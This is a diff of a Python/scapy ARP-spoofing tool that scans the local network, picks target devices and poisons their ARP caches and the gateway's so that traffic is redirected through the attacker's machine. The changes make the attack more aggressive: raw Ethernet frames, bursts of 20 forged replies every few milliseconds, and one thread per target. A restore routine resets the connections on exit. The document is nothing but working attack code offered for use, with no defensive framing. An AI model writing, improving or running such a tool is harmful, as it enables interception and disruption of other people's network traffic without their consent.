@@ -3,7 +3,7 @@ import uuid
 import os
 import socket
 from concurrent.futures import ThreadPoolExecutor
-from scapy.all import ARP, Ether, send, srp
+from scapy.all import ARP, Ether, sendp, srp
 
 if os.geteuid() != 0:
     print("Please run the script as root (e.g., using sudo).")
@@ -12,6 +12,7 @@ if os.geteuid() != 0:
 attack_in_progress = True
 ip_gateway = None
 mac_attacker = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 8 * 6, 8)][::-1])
+gateway_mac = None
 
 
 def get_local_ip():
@@ -39,10 +40,10 @@ def restore_connection(target_ip):
     mac_target = get_mac(target_ip)
     mac_gw = get_mac(ip_gateway)
     if mac_target and mac_gw:
-        arp_target = ARP(pdst=target_ip, hwdst=mac_target, psrc=ip_gateway, hwsrc=mac_gw, op=2)
-        arp_gateway = ARP(pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip, hwsrc=mac_target, op=2)
-        send(arp_target, count=5, verbose=0)
-        send(arp_gateway, count=5, verbose=0)
+        pkt1 = Ether(dst=mac_target) / ARP(op=2, pdst=target_ip, hwdst=mac_target, psrc=ip_gateway, hwsrc=mac_gw)
+        pkt2 = Ether(dst=mac_gw) / ARP(op=2, pdst=ip_gateway, hwdst=mac_gw, psrc=target_ip, hwsrc=mac_target)
+        sendp(pkt1, count=5, verbose=0)
+        sendp(pkt2, count=5, verbose=0)
         print(f"Restored connection for {target_ip}")
     else:
         print(f"Could not restore connection for {target_ip}")
@@ -73,26 +74,21 @@ def scan_network(network):
     return devices
 
 
-def spoof_targets_chunk(target_ips):
-    targets = {}
-    for ip in target_ips:
-        mac = get_mac(ip)
-        if mac:
-            targets[ip] = mac
-        else:
-            print(f"Could not get MAC for {ip}")
+def spoof_target(target_ip, target_mac):
+    global attack_in_progress, ip_gateway, mac_attacker, gateway_mac
+    pkt_target = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, psrc=ip_gateway, hwsrc=mac_attacker)
+    pkt_gateway = Ether(dst=gateway_mac) / ARP(op=2, pdst=ip_gateway, psrc=target_ip, hwsrc=mac_attacker)
     while attack_in_progress:
-        for ip, mac in targets.items():
-            arp_target = ARP(pdst=ip, hwdst=mac, psrc=ip_gateway, hwsrc=mac_attacker, op=2)
-            arp_gateway = ARP(pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip, hwsrc=mac_attacker, op=2)
-            send(arp_target, verbose=0)
-            send(arp_gateway, verbose=0)
-        time.sleep(2)
+        for _ in range(20):
+            sendp(pkt_target, verbose=0)
+            sendp(pkt_gateway, verbose=0)
+        time.sleep(0.005)
 
 
 def main():
-    global ip_gateway, attack_in_progress
+    global ip_gateway, gateway_mac, attack_in_progress
     ip_gateway = get_gateway()
+    gateway_mac = get_mac(ip_gateway)
     network = get_network()
     all_devices = scan_network(network)
     local_ip = get_local_ip()
@@ -119,11 +115,19 @@ def main():
     if not target_ips:
         print("No valid devices selected.")
         return
-    workers = min(10, len(target_ips))
-    chunks = [target_ips[i::workers] for i in range(workers)]
-    with ThreadPoolExecutor(max_workers=workers) as executor:
-        for chunk in chunks:
-            executor.submit(spoof_targets_chunk, chunk)
+    targets = {}
+    for ip in target_ips:
+        mac = get_mac(ip)
+        if mac:
+            targets[ip] = mac
+        else:
+            print(f"Could not get MAC for {ip}")
+    if not targets:
+        print("No valid targets found.")
+        return
+    with ThreadPoolExecutor(max_workers=len(targets)) as executor:
+        for ip, mac in targets.items():
+            executor.submit(spoof_target, ip, mac)
         print("ARP spoofing in progress. Press Ctrl+C to stop and restore connections.")
         try:
             while True:
@@ -131,7 +135,7 @@ def main():
         except KeyboardInterrupt:
             attack_in_progress = False
             time.sleep(2)
-            for ip in target_ips:
+            for ip in targets.keys():
                 restore_connection(ip)
             print("Attack stopped. Connections restored.")
 
